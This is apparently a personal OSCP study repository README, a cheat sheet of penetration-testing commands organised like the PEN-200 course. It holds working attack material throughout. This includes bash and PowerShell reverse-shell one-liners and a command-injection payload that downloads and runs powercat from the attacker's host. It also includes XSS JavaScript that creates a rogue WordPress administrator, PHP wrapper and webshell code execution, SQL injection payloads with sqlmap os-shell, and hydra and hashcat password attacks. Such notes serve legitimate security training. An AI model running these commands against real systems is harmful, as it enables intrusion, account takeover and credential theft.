# OSCP
OSCP references, commands, resources

Repo to reference important scripts, commands, resources, and links for reference during study for the OSCP.

This repo is structured in the same manner as the OffSec PEN-200 course and will include content from them as well as valuable external resources.

- Transfer file from rdesktop session to local host: ```rdesktop -u <username> -p <password> <IP> -r disk:tmp=/tmp```
- Transfer file from xfreerdp session to local host: ```xfreerdp /u:<username> /p:<password> /v:<IP>:3389 /drive:/home/jbregler/offsec,KALI_SHARE```
- Read a file during ftp: ```get <file name> -```

# **Passive Information Gathering**

## **Links**

- https://www.ssllabs.com/ssltest/ >> SSL Server Test analyzes a server's SSL/TLS configuration and compares it against current best practices. It will also identify some SSL/TLS related vulnerabilities, such as Poodle6 or Heartbleed. 
- https://searchdns.netcraft.com/ >> Netcraft is an internet service company, based in England, offering a free web portal that performs various information gathering functions such as discovering which technologies are running on a given website and finding which other hosts share the same IP netblock.
- https://www.shodan.io/ >> Shodan is a search engine that crawls devices connected to the internet, including the servers that run websites, but also devices like routers and IoT devices.
- https://securityheaders.com/ >> Security Headers will analyze HTTP response headers and provide basic analysis of the target site's security posture. We can use this to get an idea of an organization's coding and security practices based on the results.

## **Commands/Scripts**

### WhoIs Enumeration

- Basic whois: ``` whois <domain URL> -h <whois host IP> ```
- Reverse whois: ``` whois <NS IP> -h <whois host IP> ```

# **Active Information Gathering**

## **Links**

- None yet!

## **Commands/Scripts**

### DNS Enumeration

- Basic host: ```host <domain URL> ```'
- Record specific host: ```host -t <A, AAA, MX, TXT> <domain URL>```
- Automate forward DNS lookup...
  1. Build small list: ```cat list.txt``` >> append ```www, ftp, mail, owa, proxy router``` to the list.txt file
  2. ```for ip in $(cat list.txt); do host $ip.<domain URL>; done```
  3. Brute force reverse DNS: ```for ip in $(seq <last octect of first IP> <last octet of last IP>); do host <first 3 octets in CIDR>.$ip; done | grep -v "not found"```
- DNSRecon standard scan: ```dnsrecon -d <domain URL> -t std```
- DNSRecon brute force using same list.txt: ```dnsrecon -d <domain URL> -D ~/list.txt -t brt```
- DNS Enum standard scan: ```dnsenum <domain URL>```
- _On Windows..._
  - Basic host enumeration: ```nslookup <host FQDN>```
  - More specific host lookup: ```nslookup -type=TXT <host FQDN> <DNS server IP>```

### TCP/UDP Port Scanning

- Netcat
  - Basic Netcat TCP scan: ```nc -nvv -w 1 -z <IP> <port range>```
  - Basic Netcat UDP scan: ```nc -nv -u -z -w 1 <IP> <port range>```
- nmap
  - Basic nmap scan (hits 1000 most popular ports): ```nmap <IP>```
  - Stealth SYN scan: ```sudo nmap -sS <IP>```
  - TCP Connect scan (good for proxies): ```nmap -sT <IP>```
  - UDP SYN Scan (more complete picture): ```sudo nmap -sU -sS <IP>```
  - Basic Network sweep: ```nmap -sn <IP.1-253>```
  - Verbose Network sweep with filtered output:
    - ```nmap -v -sn <IP.1-253> -oG ping-sweep.txt```
    - then ```grep Up ping-sweep.txt | cut -d " " -f 2```
  - Specific port/service scan:
    - ```nmap -p <port number> <IP.1-253> -oG web-sweep.txt```
    - then ```grep open web-sweep.txt | cut -d" " -f2```
  - Top XX port scan on multiple IPs: ```nmap -sT -A --top-ports=XX <IP.1-253> -oG top-port-sweep.txt```
    - then ```grep open top-port-sweep.txt | cut -d" " -f2```
  - OS Fingerprint Scan: ```sudo nmap -O <host IP> --osscan-guess```
  - Banner grabbing/Service enum: ```nmap -sT -A <host IP>```
  - NSE for http-headers: ```nmap --script http-headers <host IP>```
- _On Windows..._
  - Basic Single Port Scan: ```Test-NetConnection -Port <port number> <host IP>```
  - Wider port scan: ```1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<host IP>", $_)) "TCP port $_ is open"} 2>$null```

### SMB Enumeration

- Using nmap: ```nmap -v -p 139,445 -oG smb.txt <IP.1-254>``` >>> ```cat smb.txt```
- NetBIOS info: ```sudo nbtscan -r <CIDR range>```
- nmap NSE for SMB: ```ls -1 /usr/share/nmap/scripts/smb*```
- Net View to list remote shares (on Windows): ```net view \\<share> /all```
- enum4linux:
  - User listing: ```enum4linux -U <IP>```
  - SMB share info: ```enum4linux -S <IP>```

### SMTP Enumeration

- Using nmap to find hosts with smtp: ```nmap -v -p 25 <IP.1-254>```
- Using netcat to verify smtp usage: ```nc -nv <IP> 25```
  - To see if legit root user: ```VRFY root```
  - To demonstrate known bad user: ```VRFY idontexist```
 
### SNMP Enumeration

- Using nmap to find snmp hosts: ```sudo nmap -sU --open -p 161 <IP.1-254> -oG open-snmp.txt```
- Using snmpwalk to enumerate the MIB tree: ```snmpwalk -c public -v1 -t 10 <host IP>```
- Using snmpwalk to enumerate Windows users: ```snmpwalk -c public -v1 <host IP> 1.3.6.1.4.1.77.1.2.25```
- Using snmpwalk to enumerate Windows services: ```snmpwalk -c public -v1 <host IP> 1.3.6.1.2.1.25.4.2.1.2```
- Using snmpwalk to enumerate Windows installed software: ```snmpwalk -c public -v1 <host IP> 1.3.6.1.2.1.25.6.3.1.2```
- Using snmpwalk to enumerate local open ports: ```snmpwalk -c public -v1 <host IP> 1.3.6.1.2.1.6.13.1.3```
- Using snmpwalk to translate hex to ASCII: ```snmpwalk -c public -v1 -t 10 <host IP> -Oa```

## nmapAutomator

- Example: ```./nmapAutomator.sh --host 10.1.1.1 --type All```

# Vulnerability Scanning

- Initialize Nessus: ```sudo systemctl start nessusd.service```
- nmap NSE auto-usage for category: ```sudo nmap -sV -p <port> --script "vuln" <host IP>```
- updating NSE with external scripts: ```sudo cp /home/kali/Downloads/<filename>.nse /usr/share/nmap/scripts/<filename>.nse```
  - then ```sudo nmap --script-updatedb```

# Web Application Assessment and Enumeration

- Using nmap to discover web server version: ```sudo nmap -p <port number>  -sV <host IP>```
- Running Nmap NSE http enumeration script against the target: ```sudo nmap -p <port number> --script=http-enum <host IP>```
- Passively fetch a wealth of information about the application technology stack via Wappalyzer: https://www.wappalyzer.com/lookup/
- Using Gobuster to enumerate files and directories: ```gobuster dir -u <host IP> -w /usr/share/wordlists/dirb/common.txt -t 5```
- Launching Burp: ```burpsuite```
- Grabbing the robots.txt for sitemap enum: ```curl <site URL>/robots.txt```
- Brute forcing API paths with gobuster:
  - Create the 'pattern' file with the {GOBUSTER} placeholder: ```mousepad pattern``` with ```{GOBUSTER}/v1 {GOBUSTER}/v2``` as the contents on individual lines
  - ```gobuster dir -u http://<host IP>:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern```
- Using curl to inspect API: ```curl -i http://<host IP>:5002/<API path>```
- Using curl to deeper inspect API using found data: ```gobuster dir -u http://<host IP>:5002/<API path>/<user or data>/ -w /usr/share/wordlists/dirb/small.txt```
- Crafting a POST request against a login API: ```curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://<host IP>:5002/<API path>/login```
- Attempt to register new user: ```curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://<host IP>:5002/<API path>/register```
- Changing admin password with POST request: ```curl  \
  'http://<host IP>:5002/<API path>/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <auth token>' \
  -d '{"password": "pwned"}'```
- Changing admin password with PUT request: ```curl -X 'PUT' \
  'http://<host IP>:5002/<API path>/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <auth token>' \
  -d '{"password": "pwned"}'```
- Login as admin: ```curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://<host IP>:5002/<API path>/login```
- Using Burp, from the Repeater tab, new empty request:
  ```
  POST /<API path>/login HTTP/1.1
  Host: <host IP>:5002
  Content-Type: application/json

  {
    "password":"pwned"
    "username":"admin"
  }
- JavaScript compression: https://jscompress.com/
  
## XSS

- JavaScript to gather WordPress Admin nonce:
```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
- Creating a new WordPress Admin with gathered nonce:
```
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

quick note: windows path traversal: ```curl --path-as-is http://192.168.205.193:3000/public/plugins/mysql/../../../../../../../../users/install.txt```

## Reverse Shell

- Start a Netcat listener: ```nc -nvlp 4444```
  - Bash reverse shell one-liner: ```bash -i >& /dev/tcp/<kali IP>/4444 0>&1```
  - Bash reverse shell one-liner executed as command in Bash: ```bash -c "bash -i >& /dev/tcp/<kali IP>/4444 0>&1"```
  - With URL encoding: ```bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22```

## PHP Wrappers

- Utilize the Local File Inclusion call: ```curl http://mountaindesserts.com/meteor/index.php?page=admin.php```
- Using the ```php://filter``` call: ```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php``` << the "resource" is the required parameter to specify the file stream for filtering, which is the filename in this case.
- Encoding the output for base64: ```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php```
  - Decoding the encoded output: ```echo "<output>" | base64 -d```
- Using the ```data://``` call executing the ```ls``` command: ```curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"```
- When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper: ```echo -n '<?php echo system($_GET["cmd"]);?>' | base64```
  - Then: ```curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,<output>&cmd=ls"```

## Remote File Inclusion (RFI)

- Kali Linux includes several PHP webshells in the ```/usr/share/webshells/php/``` directory
  - For example: ```cat simple-backdoor.php``` >> Usage: ```http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd```
- Start a webserver in the ```/usr/share/webshells/php/``` directory: ```python3 -m http.server 80```
- Use curl to include the hosted file via HTTP and specify 'ls' as our command: ```curl "http://mountaindesserts.com/meteor/index.php?page=http://<local IP>/simple-backdoor.php&cmd=ls"```
- Using the reverse shell, start a netcat listener on 4444: ```nc –nlvp 4444```

## File Upload Vulnerabilities

- Executable Files
  - Use benign *.txt file to test for upload filtering: ```echo "this is a test" > test.txt```
  - Upload php script like simple-backdoor.php
  - curl it: ```curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir```
  - Start a netcat listener: ```nc -nvlp 4444```
  - To use the PowerShell one-liner
    - ```pwsh```
    - PowerShell one-liner reverse-shell:
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
  - Then encode: ```$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)``` > ```$EncodedText =[Convert]::ToBase64String($Bytes)``` > ```$EncodedText```
  - Exit PowerShell with ```exit```
  - Send it with curl: ```curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<encoded>```

## OS Command Injection

- Turn on Burp: ```burpsuite```
- Send valid command and find the POST in Burp
- Note the parameter where the command is executed from
- Send arbitrary commands through the GUI like ```ifconfig``` or ```ipconfig```
  - or through a curl: ```curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive```
- Find suitable command struture and exploit... for instance:
  - ```curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive``` << using the git command and abusing it with URL encoding
  - Using Powercat to create the reverse shell: ```cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1```
  - Using a webserver to serve up: ```python3 -m http.server 80```
  - Establish the netcat listener to hold the shell: ```nc -nvlp 4444```
  - Download Powercat from our webserver and load up the reverse shell (with URL encoding): ```curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive```

## SQL Injection

- Connecting to mysql: ```mysql -u root -p'root' -h 192.168.50.16 -P 3306```
  - Grab version: ```select version();```
  - Grab current user: ```select system_user();```
  - List databases: ```show databases;```
  - List tables in a db: ```show tables in <db name>;```
  - List columns in a table: ```show columns in <dbname.tablename>;```
  - Sample query to pull data: ```SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';```
- Connecting to MSSQL with impacket: ```impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth```
  - Grab version: ```SELECT @@version;```
  - List databases: ```SELECT name FROM sys.databases;``` >> master, tempdb, model, and msdb are default databases
  - Selecting a database and listing tables: ```SELECT * FROM offsec.information_schema.tables;```
- Blind SQLi
  - Test for boolean-based: ```http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //```
  - Test for time-based: ```http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //```

### Automating SQL Injection Attacks

- Basic sqlmap to quickly find SQL injection points: ```sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user```
- Running sqlmap to Dump Users Credentials Table: ```sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump```
- Running sqlmap with os-shell: ```sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"```
  - 4 >> id >> y >> pwd >> y

# Client-side Info Gathering

- Grab metadata from Document: ```exiftool -a -u <filename>```
- Canarytokens, a free web service that generates a link with an embedded token to send to the target. When the target opens the link in a browser, we will get information about their browser, IP address, and operating system. >> ```https://canarytokens.org/generate```

# **Password Attacks**

- Wordlist location: ```/usr/share/wordlists/```
- To unzip wordlist: ```sudo gzip -d rockyou.txt.gz```
- Using wordlist with hydra for specific user: ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<target IP>```
- Using hydra with known password against list of usernames: ```hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://<target IP>```
- Using hydra with http-get: ```hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.218.201``` <15.1.2>
- hashcat rules can be found: ```/usr/share/hashcat/rules```
- Using hashcat to crack known hash: ``` hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force```
- Using hashid to determine hash type: ```hashid -m <hash>``` >> NOTE: single quotes may be needed around the hash to process it
